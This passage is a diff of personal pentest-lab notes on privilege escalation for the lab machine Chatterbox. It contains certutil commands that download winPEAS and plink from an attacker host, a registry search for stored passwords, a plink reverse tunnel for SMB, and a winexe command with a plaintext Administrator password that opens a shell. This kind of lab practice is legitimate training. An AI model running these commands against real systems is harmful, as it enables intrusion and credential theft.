@@ -365,27 +365,50 @@ Achat Exploit (Metasploit) - https://www.rapid7.com/db/modules/exploit/windows/m
 > [!todo] 
 > Start Webserver on Attacker VM:
 > `python3 -m http.server`
-> Download winPEAS on Target VM:
-> `certutil.exe -urlcache -f http://10.10.14.46:8000/winPEASx86.exe  winPEASx86.exe` 
+> Privilege Escalation Windows Guide:
+> https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+![[Pasted image 20230507094649.png]]
+
+> [!todo] 
+> Search for password in registry
+`reg query HKLM /f password /t REG_SZ /s `
+
+![[Pasted image 20230507094910.png]]
+
+![[Pasted image 20230507095048.png]]
+
+> [!todo] 
+> On Attacker Kali:
+> sudo apt install ssh
+> sudo gedit /etc/ssh/sshd_config
+> Set `PermitRootLogin yes`
+> Set `Port 2222`
+> sudo passwd root 
+> sudo service ssh restart
+> sudo service ssh start 
+
+> [!todo] 
+> `certutil.exe -urlcache -f http://10.10.14.25:8000/plink_32.exe  plink_32.exe`
+> `plink_32.exe -l root -pw 3383100 -P 2222  -R 445:127.0.0.1:445 10.10.14.25 `
+
+> [!todo] 
+> Now we have shell in shell on  `Kali -> Windows -> Kali` with connected smb service port 
+>
+> `winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"`
+
+> [!caution] 
+> Looks like Chatterbox having issues! 
+> 
+> ![[Pasted image 20230507142443.png]]
 
 
-![[Pasted image 20230504153135.png]]
+## Escalation Path: Windows Subsystem for Linux
 
-![[Pasted image 20230504153544.png]]
+### Overview
 
-
-
-![[Pasted image 20230504153718.png]]
+![[Pasted image 20230507144305.png]]
 
 
-    CHATTERBOX\Administrator: Built-in account for administering the computer/domain
-        |->Groups: Administrators
-        |->Password: CanChange-NotExpi-Req
+### Gaining a Foothold (Box 3)
 
-    CHATTERBOX\Alfred
-        |->Groups: Users
-        |->Password: CanChange-Expi-Req
-
-    CHATTERBOX\Guest(Disabled): Built-in account for guest access to the computer/domain
-        |->Groups: Guests
-        |->Password: NotChange-NotExpi-NotReq
